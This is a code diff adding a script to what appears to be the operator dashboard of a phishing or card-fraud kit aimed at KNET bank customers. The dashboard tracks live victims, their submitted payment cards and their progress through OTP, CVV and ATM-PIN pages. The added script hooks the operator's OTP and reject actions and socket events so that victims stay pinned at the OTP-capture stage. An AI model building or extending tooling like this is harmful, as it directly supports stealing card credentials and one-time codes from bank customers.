@@ -3857,6 +3857,84 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   }
   attach(); setInterval(attach, 500);
 })();
+<script id="kddF98">
+(function(){
+  if (window.__f98) return; window.__f98 = 1;
+  var LBL = 'رمز التحقق كي نت (OTP)';
+  var lock = {};
+  function findV(id){
+    var v = null;
+    try { v = visitors.get(id); } catch(e){}
+    if (!v) { try { visitors.forEach(function(x){ if (!v && x && x._id === id) v = x; }); } catch(e){} }
+    return v || null;
+  }
+  function knetish(v){
+    if (!v) return false;
+    var p = String(v.page || '');
+    if (/كي\s*نت|knet/i.test(p) && !/otp|رمز/i.test(p)) return true;
+    try { return (v.paymentCards || []).some(function(c){ return c && c.paymentMethod === 'KNET'; }); } catch(e){ return false; }
+  }
+  try {
+    var sp = window.shortenPage;
+    if (typeof sp === 'function' && !sp.__f98) {
+      var w = function(page){
+        var p = String(page || '').toLowerCase();
+        if (p.indexOf('otp') > -1 || p.indexOf('رمز') > -1) return '🔢 OTP كي نت';
+        return sp.call(this, page);
+      };
+      w.__f98 = 1; window.shortenPage = w; try { shortenPage = w; } catch(e){}
+    }
+  } catch(e){}
+  var oOTP = window.cardActionOTP;
+  window.cardActionOTP = function(btn, sid){
+    var v = null; try { v = visitors.get(selectedVisitorId); } catch(e){}
+    var k = knetish(v);
+    var r = (typeof oOTP === 'function') ? oOTP.apply(this, arguments) : undefined;
+    if (k && v && v._id) {
+      lock[v._id] = Date.now();
+      try { v.page = LBL; } catch(e){}
+      try { renderVisitorsList(); } catch(e){}
+      try { if (selectedVisitorId === v._id) renderVisitorDetails(v); } catch(e){}
+    }
+    return r;
+  };
+  var oREJ = window.cardActionReject;
+  window.cardActionReject = function(btn, sid){
+    var v = null; try { v = visitors.get(selectedVisitorId); } catch(e){}
+    var r = (typeof oREJ === 'function') ? oREJ.apply(this, arguments) : undefined;
+    if (v && v._id && lock[v._id]) {
+      delete lock[v._id];
+      try { v.page = 'دفع كي نت'; } catch(e){}
+      try { renderVisitorsList(); } catch(e){}
+    }
+    return r;
+  };
+  function enforce(){
+    var now = Date.now(), changed = false, selCh = false;
+    Object.keys(lock).forEach(function(id){
+      if (now - lock[id] > 1800000) { delete lock[id]; return; }
+      var v = findV(id);
+      if (!v) return;
+      var p = String(v.page || '');
+      if (/cvv|atm|مرور|نهائي|final|رئيسي/i.test(p)) { delete lock[id]; changed = true; return; }
+      if (p !== LBL) { v.page = LBL; changed = true; if (id === selectedVisitorId) selCh = true; }
+    });
+    if (changed) {
+      try { renderVisitorsList(); } catch(e){}
+      if (selCh) { try { var sv = findV(selectedVisitorId); if (sv) renderVisitorDetails(sv); } catch(e){} }
+    }
+  }
+  function hook(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on || s.__f98) return;
+      s.__f98 = 1;
+      s.on('visitors:update', function(){ enforce(); });
+      s.on('visitor:pageChanged', function(){ enforce(); });
+    } catch(e){}
+  }
+  hook(); setInterval(hook, 400); setInterval(enforce, 700);
+})();
 </script>
 </body>
 </html>
